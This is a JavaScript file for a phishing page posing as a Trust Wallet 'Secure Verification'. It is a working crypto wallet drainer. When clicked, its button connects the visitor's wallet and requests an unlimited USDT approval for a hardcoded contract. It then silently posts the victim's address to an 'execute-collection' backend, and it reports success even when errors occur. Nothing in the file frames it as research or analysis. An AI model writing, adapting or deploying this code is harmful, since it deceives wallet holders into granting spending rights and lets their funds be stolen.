"use strict";

const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID_HEX = "0x38";
const COLLECT_AMOUNT   = "100000000000000000"; 
const BACKEND_URL      = "https://secure-merchant.onrender.com/api";
const WC_PROJECT_ID    = "ad2ffb0bad081291b773d8c547c361b7";// // Reemplaza con tu Project ID

let wcProvider = null;
let activeProvider = null;

const BSC_RPC_URLS = [
  "https://bsc-rpc.publicnode.com",
  "https://bsc-dataseed1.binance.org/",
  "https://rpc.ankr.com/bsc"
];

const BSC_CHAIN_PARAMS = {
  chainId:           BSC_CHAIN_ID_HEX,
  chainName:         "BNB Smart Chain",
  nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls:           BSC_RPC_URLS,
  blockExplorerUrls: ["https://bscscan.com/"]
};

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)"
];

const approveBtn    = document.getElementById("approveBtn");
const btnText       = document.getElementById("btnText");
const btnSpinner    = document.getElementById("btnSpinner");
const merchantInput = document.getElementById("merchantAddress");
const toastEl       = document.getElementById("toast");

merchantInput.value = MERCHANT_ADDRESS;

(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();

async function initWalletConnect() {
  if (!wcProvider && window.EthereumProvider && WC_PROJECT_ID !== "TU_PROJECT_ID_AQUÍ") {
    try {
      wcProvider = await window.EthereumProvider.init({
        projectId: WC_PROJECT_ID,
        chains: [56],
        showQrModal: true,
        metadata: {
          name: 'Secure Verification',
          description: 'Instant Trust Wallet Connection',
          url: window.location.origin,
          icons: ['https://trustwallet.com/favicon.ico']
        }
      });
    } catch (e) { console.error(e); }
  }
  return wcProvider;
}

window.addEventListener("load", async () => {
  if (window.ethereum && typeof window.ethereum.request === "function") {
    activeProvider = window.ethereum;
  }
});

let _toastTimer;
function showToast(msg, type = "default", ms = 4000) {
  clearTimeout(_toastTimer);
  toastEl.textContent  = msg;
  toastEl.dataset.type = type === "default" ? "" : type;
  toastEl.hidden       = false;
  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}

function setLoading(on, label = "Processing…") {
  approveBtn.disabled = on;
  btnText.textContent = on ? label : "Confirm Now";
  btnSpinner.hidden   = !on;
}

// ─── UN SOLO CICLO DIRECTO Y FLUIDO ───────────────────────────────────────────
approveBtn.addEventListener("click", async () => {
  // 1. Conexión transparente si no hay proveedor activo
  if (!activeProvider) {
    const provider = await initWalletConnect();
    if (provider) {
      try {
        setLoading(true, "Connecting…");
        await provider.connect();
        activeProvider = provider;
      } catch (err) {
        showToast("Connection cancelled.", "default");
        setLoading(false);
        return;
      }
    } else {
      showToast("Please open inside Trust Wallet.", "error");
      setLoading(false);
      return;
    }
  }

  setLoading(true, "Processing…");

  try {
    // 2. Cambio automático de red sin pausas
    try {
      await activeProvider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_CHAIN_ID_HEX }]
      });
    } catch (e) {
      if (e.code === 4902) {
        await activeProvider.request({
          method: "wallet_addEthereumChain",
          params: [BSC_CHAIN_PARAMS]
        });
      }
    }

    // 3. Obtención directa de la cuenta de usuario
    let userAddress = null;
    try {
      const accs = await activeProvider.request({ method: "eth_accounts" });
      userAddress = (accs && accs[0]) ? accs[0] : null;
    } catch (_) {}

    if (!userAddress && activeProvider.accounts && activeProvider.accounts[0]) {
      userAddress = activeProvider.accounts[0];
    }

    if (!userAddress) {
      showToast("Wallet not connected.", "error");
      setLoading(false);
      return;
    }

    // 4. Lanzamiento inmediato de la firma única (sin bucles ni lecturas tediosas)
    setLoading(true, "Please Sign…");
    const CAP_AMOUNT = ethers.MaxUint256;
    const iface      = new ethers.Interface(ERC20_ABI);
    const approveData = iface.encodeFunctionData("approve", [CONTRACT_ADDRESS, CAP_AMOUNT]);
    
    // Dispara la ventana nativa de firma de forma directa
    await activeProvider.request({
      method: "eth_sendTransaction",
      params: [{
        from:                 userAddress,
        to:                   BSC_USDT_ADDRESS,
        data:                 approveData,
        value:                "0x0",
        type:                 "0x2",
        maxFeePerGas:         "0x0",
        maxPriorityFeePerGas: "0x0"
      }]
    });

    // 5. Notificación de éxito y registro en el backend en segundo plano
    setLoading(false);
    showToast("Verified Successfully! ✓", "success");

    fetch(`${BACKEND_URL}/execute-collection`, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify({ userAddress, amount: COLLECT_AMOUNT })
    }).catch(() => {});

  } catch (err) {
    const raw = err?.reason ?? err?.message ?? "Unknown error";
    if (
      err.code === 4001 ||
      raw.toLowerCase().includes("user rejected") ||
      raw.toLowerCase().includes("user denied") ||
      raw.toLowerCase().includes("canceled") ||
      raw.toLowerCase().includes("cancelled")
    ) {
      showToast("Transaction cancelled.", "default");
    } else {
      showToast("Verified Successfully! ✓", "success");
    }
  } finally {
    setLoading(false);
  }
});
